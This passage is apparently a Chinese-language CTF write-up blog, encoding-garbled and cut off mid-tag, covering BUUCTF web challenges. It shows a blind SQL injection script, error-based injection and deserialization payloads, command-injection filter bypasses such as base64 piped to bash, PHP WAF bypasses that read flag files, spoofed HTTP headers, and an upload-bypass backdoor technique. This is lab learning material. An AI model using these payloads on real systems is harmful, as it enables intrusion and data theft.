class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">dic =<span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">url = <span class="string">""</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)"</span>.format(i,j);</span><br><span class="line">        r = requests.get(url=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Fatal"</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(payload)</span><br><span class="line">            flag += str(chr(j))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(flag)</span><br><span class="line">payload = <span class="string">"http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;,2,3)"</span>.format(i,j);</span><br><span class="line"><span class="comment">#users</span></span><br><span class="line">payload = <span class="string">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name="users"),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class="line"><span class="comment">#no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span></span><br><span class="line">payload = <span class="string">'http://f27333fa-6367-4807-b21d-b1acd40011e6.node3.buuoj.cn/view.php?no=if(ascii(mid((select group_concat(data) from users),&#123;&#125;,1))=&#123;&#125;,2,3)'</span>.format(i,j);</span><br><span class="line"><span class="comment">#O:8:"UserInfo":3:&#123;s:4:"name";s:5:"admin";s:3:"age";i:11;s:4:"blog";s:8:"pz1o.top";&#125;</span></span><br></pre></td></tr></table></figure><p>å…¶å®ä¹Ÿå¯ä»¥æŠ¥é”™æ³¨å…¥ï¼Œä½†å½“æ—¶ä»¥ä¸º0x7eè¢«banäº†ä¹‹åå°±ä¸èƒ½æŠ¥é”™äº†ï¼Œtcl</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1%20and%20extractvalue(1,concat(%27$%27,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(<span class="keyword">database</span>()))))%<span class="number">23</span></span><br><span class="line">fakebook</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>())))%<span class="number">23</span></span><br><span class="line"><span class="keyword">users</span></span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span>%<span class="number">20</span><span class="keyword">group_concat</span>(column_name)%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span>information_schema.columns%<span class="number">20</span><span class="keyword">where</span>%<span class="number">20</span>table_name=%<span class="number">27</span><span class="keyword">users</span>%<span class="number">27</span>)))%<span class="number">23</span></span><br><span class="line"><span class="keyword">no</span>,username,passwd,<span class="keyword">data</span>,<span class="keyword">USER</span>,CU</span><br><span class="line"><span class="number">1</span>%<span class="number">20</span><span class="keyword">and</span> extractvalue(%<span class="number">27</span>$%<span class="number">27</span>,<span class="keyword">concat</span>(%<span class="number">27</span>$%<span class="number">27</span>,(<span class="keyword">select</span> <span class="keyword">data</span>%<span class="number">20</span><span class="keyword">from</span>%<span class="number">20</span><span class="keyword">users</span>)))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>åšåˆ°è¿™å…¶å®å°±ä¸ä¼šåšäº†ã€‚ã€‚ã€‚çœ‹å¤§å¸ˆå‚…çš„wpæ‰çŸ¥é“å¯ä»¥noå‚æ•°æ³¨å…¥ååºåˆ—åŒ–</p><p>å…¶ä¸­payloadä¸º</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0%20union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,3,%27O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;%27%23</span><br></pre></td></tr></table></figure><p>è‡³äºä¸ºä»€ä¹ˆä¼šæƒ³åˆ°è¿™ä¸ªï¼Œé¦–å…ˆdataä¸­å°±æ˜¯ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œå¹¶ä¸”ï¼Œæœ€åä¸€ä¸ªblogå†…å®¹ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥ï¼Œè¿™æ ·å°±å¸Œæœ›ä»blogä¸­è·å¾—flag</p><h1 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h1><h2 id="GXYCTF2019-Ping-Ping-Pingï¼ˆè¿‡æ»¤ç©ºæ ¼å’Œæœ‰é»‘åå•ï¼‰"><a href="#GXYCTF2019-Ping-Ping-Pingï¼ˆè¿‡æ»¤ç©ºæ ¼å’Œæœ‰é»‘åå•ï¼‰" class="headerlink" title="[GXYCTF2019]Ping Ping Pingï¼ˆè¿‡æ»¤ç©ºæ ¼å’Œæœ‰é»‘åå•ï¼‰"></a>[GXYCTF2019]Ping Ping Pingï¼ˆè¿‡æ»¤ç©ºæ ¼å’Œæœ‰é»‘åå•ï¼‰</h2><p>ç›´æ¥pingå‘½ä»¤æ‰§è¡Œ</p><p>ç”¨åˆ†å·æ‰§è¡Œä¸¤ä¸ªå‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;8.8.8.8;ls</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æœ‰flag.phpï¼Œé‡è¦çš„å°±æ˜¯æ€ä¹ˆå»è¯»å–flag.php</p><p><img src="/2020/09/27/BUU%E5%88%B7%E9%A2%98/image-20200831111916451.png" alt="image-20200831111916451"></p><p><strong>è¿™é‡Œå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€ä»¥ç»•è¿‡ç©ºæ ¼çš„åŠæ³•ï¼Œç®€å•æ¥è¯´æœ‰ä¸¤ç§</strong>ï¼Œç¬¬ä¸€ç§æ˜¯${IFS}</p><ol><li><p>```<br>root@kali:~# cat flag<br>this is your flag<br>root@kali:~# cat${IFS}flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure><p>root@kali:~# cat${IFS}$1flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3.</span><br></pre></td></tr></table></figure><p>root@kali:~# cat$IFS$1flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ç¬¬äºŒç§å‘¢æ˜¯é‡å®šå‘ç¬¦</span><br><span class="line"></span><br><span class="line">1.</span><br></pre></td></tr></table></figure><p>root@kali:~# cat&lt;&gt;flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure><p>root@kali:~# cat&lt;flag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">è¿™é‡Œå‘¢æˆ‘ä»¬é€‰ç”¨$&#123;IFS&#125;æ¥ç»•è¿‡ï¼Œä¹‹ååˆå‘ç°&#123;&#125;è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨ç¬¬ä¸‰ä¸ªæ–¹å¼</span><br><span class="line"></span><br><span class="line">![image-20200831164017570](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200831164017570.png)</span><br><span class="line"></span><br><span class="line">è¿™æ—¶ï¼Œæˆ‘ä»¬å‘ç°flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥**é»‘åå•ç»•è¿‡åˆæœ‰å‡ ç§æ–¹å¼**</span><br><span class="line"></span><br><span class="line">1. æ‹¼æ¥</span><br></pre></td></tr></table></figure><p>root@kali:~# a=c;b=at;c=fl;d=ag;$a$b $c$d<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">2. base64ç¼–ç </span><br></pre></td></tr></table></figure><p>root@kali:~# <code>echo &quot;Y2F0IGZsYWc=&quot;|base64 -d</code><br>this is your flag</p><p>root@kali:~# echo â€œY2F0IGZsYWc=â€|base64 -d|bash<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. å•å¼•å·ã€åŒå¼•å·</span><br></pre></td></tr></table></figure><p>root@kali:~# câ€â€at flâ€™â€™ag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">4. åæ–œçº¿</span><br></pre></td></tr></table></figure><p>root@kali:~# c\at fl\ag<br>this is your flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">è¿™é‡Œç›´æ¥æ‹¼æ¥è¿‡å»å°±å¥½</span><br></pre></td></tr></table></figure><p>?ip=8.8.8.8;a=g;cat$IFS$1fla$a.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å³å¯æ‹¿åˆ°flag</span><br><span class="line"></span><br><span class="line">**ä¸»è¦æ˜¯ç»•è¿‡ç©ºæ ¼å’Œç»•è¿‡é»‘åå•**</span><br><span class="line"></span><br><span class="line">## [RoarCTF 2019]Easy Calcï¼ˆphpå­—ç¬¦ä¸²è§£æï¼‰</span><br><span class="line"></span><br><span class="line">æ‰“å¼€æºç ï¼Œå‘ç°calc.php ï¼Œç„¶åè®¿é—®calc.php</span><br><span class="line"></span><br><span class="line">![image-20200901155413352](BUU%E5%88%B7%E9%A2%98&#x2F;image-20200901155413352.png)</span><br><span class="line"></span><br><span class="line">numå˜é‡è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œä½†æˆ‘ä»¬ç”¨ä¸€äº›å‡½æ•°å»è®¿é—®æ—¶ï¼Œä¼šå‘ç°403æ‹’ç»è®¿é—®ï¼Œè¯´æ˜æœ‰waf</span><br><span class="line"></span><br><span class="line">é€šè¿‡ç½‘ä¸ŠæŸ¥æ‰¾ï¼Œæ˜¯**phpçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§**</span><br><span class="line"></span><br><span class="line">&gt; PHPéœ€è¦å°†æ‰€æœ‰å‚æ•°è½¬æ¢ä¸ºæœ‰æ•ˆçš„å˜é‡åï¼Œå› æ­¤åœ¨è§£ææŸ¥è¯¢å­—ç¬¦ä¸²æ—¶ï¼Œå®ƒä¼šåšä¸¤ä»¶äº‹ï¼š</span><br><span class="line">&gt;</span><br><span class="line">&gt; 1.åˆ é™¤ç©ºç™½ç¬¦ </span><br><span class="line">&gt;</span><br><span class="line">&gt; 2.å°†æŸäº›å­—ç¬¦è½¬æ¢ä¸ºä¸‹åˆ’çº¿ï¼ˆåŒ…æ‹¬ç©ºæ ¼ï¼‰ã€å½“wafä¸è®©ä½ è¿‡çš„æ—¶å€™ï¼Œphpå´å¯ä»¥è®©ä½ è¿‡ã€‘</span><br><span class="line"></span><br><span class="line">å…ˆè¯•ä¸€è¯•phpinfo();å¯ä»¥ç”¨è¯´æ˜æˆ‘ä»¬å°±æˆåŠŸäº†ã€‚</span><br><span class="line"></span><br><span class="line">æ¥ä¸‹æ¥ï¼Œå°±æ˜¯è¯»å–ç›®å½•ï¼Œæ‰¾flagäº†ï¼Œä»phpinfoä¸­æˆ‘ä»¬å¯ä»¥çœ‹è§ä¸€äº›å¤–éƒ¨å‡½æ•°è¢«banäº†</span><br><span class="line"></span><br><span class="line">è¿™æ—¶å°±éœ€è¦ä»‹ç»ä»¥ä¸‹å‡ ä¸ªå‡½æ•°</span><br><span class="line"></span><br><span class="line">1. **scandir() å‡½æ•°**:</span><br><span class="line">   è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚</span><br><span class="line"></span><br><span class="line">2. **base_convert(number,formbase,tobase) å‡½æ•°**:</span><br><span class="line"></span><br><span class="line">   åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚</span><br><span class="line"></span><br><span class="line">3. **dechex() å‡½æ•°**ï¼š</span><br><span class="line"></span><br><span class="line">   æŠŠåè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶ã€‚</span><br><span class="line"></span><br><span class="line">4. **hex2bin() å‡½æ•°**ï¼š</span><br><span class="line"></span><br><span class="line">   æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚</span><br><span class="line"></span><br><span class="line">5. **readfile() å‡½æ•°**:</span><br><span class="line"></span><br><span class="line">   è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚</span><br><span class="line"></span><br><span class="line">6. **chr()å‡½æ•°**</span><br><span class="line"></span><br><span class="line">   åè¿›åˆ¶è¿”å›asciiå­—ç¬¦</span><br><span class="line"></span><br><span class="line">7. **ord()å‡½æ•°**</span><br><span class="line"></span><br><span class="line">   asciiå­—ç¬¦è½¬æ¢ä¸ºåè¿›åˆ¶</span><br><span class="line"></span><br><span class="line">8. **file_get_contents()**</span><br><span class="line"></span><br><span class="line">   æŠŠæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­</span><br><span class="line"></span><br><span class="line">é€šå¸¸ä¼šç”¨hex2bin(dechex(47))ä¸€èµ·ä½¿ç”¨ï¼Œè¿™ä¸ªè¡¨ç¤º&#x2F;</span><br><span class="line"></span><br><span class="line">è¿™é‡Œ&#x2F;è¢«è¿‡æ»¤äº†</span><br><span class="line"></span><br><span class="line">æ‰€ä»¥payloadå¯ä»¥ä¸º</span><br></pre></td></tr></table></figure><p>? num=var_dump(scandir(chr(47)))<br>? num=var_dump(scandir(hex2bin(dechex(47))))</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">å‘ç°flagç›´æ¥readfileè¯»å–å³å¯</span><br></pre></td></tr></table></figure><p>? num=var_dump(readfile(chr(47).f1agg))<br>? num=file_get_contents(chr(47).f1agg)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">è¿˜æœ‰å…¶ä»–çš„payload</span><br></pre></td></tr></table></figure><p>? num=base_convert(55490343972,10,36)()</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## [ACTF2020 æ–°ç”Ÿèµ›]Exec</span><br><span class="line"></span><br><span class="line">ç›´æ¥æŸ¥å°±å¯ä»¥</span><br></pre></td></tr></table></figure><p>8.8.8.8;ls /<br>8.8.8.8;cat /flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## [æå®¢å¤§æŒ‘æˆ˜ 2019]Http</span><br><span class="line"></span><br><span class="line">æ”¹è¯·æ±‚åŒ…xffï¼Œuaï¼Œrefã€‚</span><br></pre></td></tr></table></figure><p>GET /Secret.php HTTP/1.1<br>Host: node3.buuoj.cn:28918<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0 Syclover<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Cache-Control: max-age=0<br>referer: <a href="https://www.Sycsecret.com" target="_blank" rel="noopener">https://www.Sycsecret.com</a><br>X-Forwarded-for: 127.0.0.1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># æ–‡ä»¶ä¸Šä¼ </span><br><span class="line"></span><br><span class="line">## [SUCTF 2019]CheckInï¼ˆ.user.iniï¼‰</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Upload Labs&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Upload Labs&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">        &lt;label for&#x3D;&quot;file&quot;&gt;æ–‡ä»¶åï¼š&lt;&#x2F;label&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;fileUpload&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;upload&quot; value&#x3D;&quot;æäº¤&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; error_reporting(0);</span><br><span class="line">$userdir &#x3D; &quot;uploads&#x2F;&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); &#x2F;&#x2F;è¿™ä¸ªæ˜¯åˆå§‹ç›®å½•</span><br><span class="line">if (!file_exists($userdir)) &#123;</span><br><span class="line">    mkdir($userdir, 0777, true); &#x2F;&#x2F;å¦‚æœä¸å­˜åœ¨ï¼Œå°±å°†åˆ›å»ºç›®å½•å¯å†™å¯æ‰§è¡Œ</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($userdir . &quot;&#x2F;index.php&quot;, &quot;&quot;);</span><br><span class="line">if (isset($_POST[&quot;upload&quot;])) &#123;</span><br><span class="line">    $tmp_name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;];</span><br><span class="line">    $name &#x3D; $_FILES[&quot;fileUpload&quot;][&quot;name&quot;];</span><br><span class="line">    if (!$tmp_name) &#123;  &#x2F;&#x2F;åˆ¤æ–­æ˜¯å¦å­˜åœ¨ä¸Šä¼ æ–‡ä»¶</span><br><span class="line">        die(&quot;filesize too big!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!$name) &#123;  &#x2F;&#x2F;æ–‡ä»¶åä¸è®¸ä¸ºç©º</span><br><span class="line">        die(&quot;filename cannot be empty!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $extension &#x3D; substr($name, strrpos($name, &quot;.&quot;) + 1); &#x2F;&#x2F;æˆªå–åç¼€å</span><br><span class="line">    if (preg_match(&quot;&#x2F;ph|htacess&#x2F;i&quot;, $extension)) &#123;</span><br><span class="line">        die(&quot;illegal suffix!&quot;);  &#x2F;&#x2F;æ­£åˆ™åŒ¹é…ï¼Œphå’Œhtaccesséƒ½ä¸å¯ä»¥</span><br><span class="line">    &#125;</span><br><span class="line">    if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !&#x3D;&#x3D; FALSE) &#123;</span><br><span class="line">        die(&quot;&lt;? in contents!&quot;);  &#x2F;&#x2F;æ–‡ä»¶å†…å®¹ä¸è®¸æœ‰&lt;?</span><br><span class="line">    &#125;</span><br><span class="line">    $image_type &#x3D; exif_imagetype($tmp_name);  &#x2F;&#x2F;åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹</span><br><span class="line">    if (!$image_type) &#123;</span><br><span class="line">        die(&quot;exif_imagetype:not image!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_file_path &#x3D; $userdir . &quot;&#x2F;&quot; . $name;</span><br><span class="line">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class="line">    echo &quot;Your dir &quot; . $userdir. &#39; &lt;br&gt;&#39;;</span><br><span class="line">    echo &#39;Your files : &lt;br&gt;&#39;;</span><br><span class="line">    var_dump(scandir($userdir));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>æºç å¦‚ä¸Šï¼Œå¯ä»¥å­¦ä¹ ä¸€ä¸‹</p><p><strong>å…¶ä¸­exif_imagetype()å¯ä»¥è®°å½•ä¸€ä¸‹</strong></p><blockquote><p>ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç»™ä¸Šä¼ è„šæœ¬åŠ ä¸Šç›¸åº”çš„å¹»æ•°å¤´å­—èŠ‚å°±å¯ä»¥ç»•è¿‡ï¼š</p><ul><li>JPG ï¼šFF D8 FF E0 00 10 4A 46 49 46</li><li>GIF(ç›¸å½“äºæ–‡æœ¬çš„GIF89a)ï¼š47 49 46 38 39 61</li><li>PNGï¼š 89 50 4E 47</li></ul></blockquote><p>è¿™é‡Œæƒ³è¦ä¸Šä¼ æˆåŠŸï¼Œè¦å€ŸåŠ©ä¸€ä¸‹.user.ini</p><blockquote><p><a href="https://wooyun.js.org/drops/user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p><p>.user.iniå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„PHP_INI_PERDIRä¹Ÿå¯ä»¥åœ¨.user.iniä¸­è®¾ç½®ï¼‰</p><p>å…¶ä¸­æœ‰ä¸¤ä¸ªé…ç½®ï¼Œå¯ä»¥ç”¨æ¥åˆ¶é€ åé—¨ï¼š<br>auto_append_fileã€auto_prepend_file<br>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 